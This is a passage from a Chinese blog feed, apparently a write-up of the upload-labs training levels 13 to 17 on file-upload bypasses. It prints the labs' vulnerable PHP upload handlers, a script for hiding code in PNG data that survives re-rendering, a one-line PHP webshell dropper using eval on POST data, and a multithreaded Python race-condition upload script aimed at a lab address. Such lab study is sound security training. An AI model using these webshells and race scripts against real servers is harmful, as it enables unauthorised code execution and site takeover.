class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);</span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);</span><br><span class="line">    $fileType = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:</span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:</span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:</span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>getReailFileType函数只会读取文件的前两个字节:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br></pre></td></tr></table></figure><p>所以我们伪造一个文件头即可，使用图马可以轻松绕过。利用的话，还需要结合文件包含漏洞。</p><h2 id="第14关-getimagesize"><a href="#第14关-getimagesize" class="headerlink" title="第14关 getimagesize"></a>第14关 getimagesize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>校验了文件头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure><p>利用图片马就可进行绕过</p><h2 id="第15关-exif-imagetype"><a href="#第15关-exif-imagetype" class="headerlink" title="第15关 exif_imagetype"></a>第15关 exif_imagetype</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><h2 id="第16关-二次渲染绕过"><a href="#第16关-二次渲染绕过" class="headerlink" title="第16关 二次渲染绕过"></a>第16关 二次渲染绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。</p><p>所以要把木马放到两次渲染后活下来的数据块里。<br>这里有国外大牛写的脚本，直接拿来运行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>详细步骤转载：<a href="https://yang1k.github.io/post/upload-pass16/" target="_blank" rel="noopener">https://yang1k.github.io/post/upload-pass16/</a></p><p>upload-labs之pass 16详细分析<br><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><h2 id="第17关-条件竞争"><a href="#第17关-条件竞争" class="headerlink" title="第17关 条件竞争"></a>第17关 条件竞争</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>观察代码先传再验证是否符合要求，所以利用条件竞争删除文件时间差绕过。这里先将文件上传到服务器，然后通过rename修改名称：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line">$img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">rename($upload_file, $img_path);</span><br></pre></td></tr></table></figure><p>再通过unlink删除文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink($upload_file);</span><br></pre></td></tr></table></figure><p>因此可以通过条件竞争的方式在unlink之前，访问webshell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'gg.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[1])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>该木马可以在被杀掉的瞬间创建一个<code>gg.php</code>子木马</p></blockquote><p><strong>BurpSuite 空字节爆破：</strong><br>原理：第一个payload执行<code>shell.php</code> 第二个payload不断访问<code>www/upload/shell.php</code>直到生成<code>gg.php</code></p><p>选择没有载荷</p><p><img src="http://qiniuyun.lintstar.top/20200803142155.png" alt="20200803142155"></p><p><strong>使用Python脚本实现多线程下一直访问<code>shell.php</code>，直到生成<code>gg.php</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span><span class="params">(list)</span>:</span></span><br><span class="line">    url=<span class="string">"http://192.168.242.128/upload-labs/Pass-17/index.php"</span></span><br><span class="line">    geturl=<span class="string">"http://192.168.242.128/upload-labs/upload/info.php"</span></span><br><span class="line">    file=&#123;<span class="string">'upload_file'</span>:(<span class="string">'info.php'</span>,<span class="string">"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;"</span>,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    data=&#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</span><br><span class="line">    r=requests.post(url=url,data=data,files=file)</span><br><span class="line">    <span class="comment">#print "test upload...."</span></span><br><span class="line">    r1=requests.get(url=geturl)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"upload success!"</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    pool = Pool(<span class="number">10</span>)</span><br><span class="line">    pool.map(CompeteUpload, range(<span class="number">10000</span>))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;h2 id=&quot;文件上传漏洞简介&quot;&gt;&lt;a href=&quot;#文件上传漏洞简介&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>身份认证技术</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined03/e9e5edd8.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined03/e9e5edd8.html</id>
    <published>2020-08-03T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:56.212Z</updated>
    
